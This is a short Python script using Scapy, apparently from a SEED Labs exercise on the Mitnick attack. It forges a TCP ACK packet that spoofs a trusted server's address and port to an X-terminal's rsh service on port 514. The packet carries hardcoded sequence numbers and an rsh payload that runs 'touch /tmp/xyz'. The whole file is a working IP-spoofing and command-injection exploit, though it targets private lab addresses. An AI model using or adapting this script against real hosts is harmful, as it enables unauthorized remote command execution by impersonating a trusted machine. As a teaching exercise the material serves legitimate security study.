#!/user/bin/python3
from scapy.all import*

trusted_server = "10.9.0.6"  # server ip
trusted_port = 1023          # server port
victim = "10.9.0.5"          # x-terminal ip
victim_port = 514            # x-terminal port

x_ip = victim #X-terminal IP
x_port = victim_port #Port number used by X-Terminal

srv_ip = trusted_server #The Trusted Server IP
srv_port = trusted_port #Port number used by the Trusted Server 

IPLayer = IP(src= trusted_server, dst= victim)
TCPLayer = TCP(sport=srv_port, dport=victim_port, flags="A", seq=778933536, ack=4048017697)

if TCPLayer.flags == "A":
	print("Sending ACK...")

data='9090\x00seed\x00dees\x00touch /tmp/xyz\00'

pkt= IPLayer/TCPLayer/data
send(pkt, verbose=0)
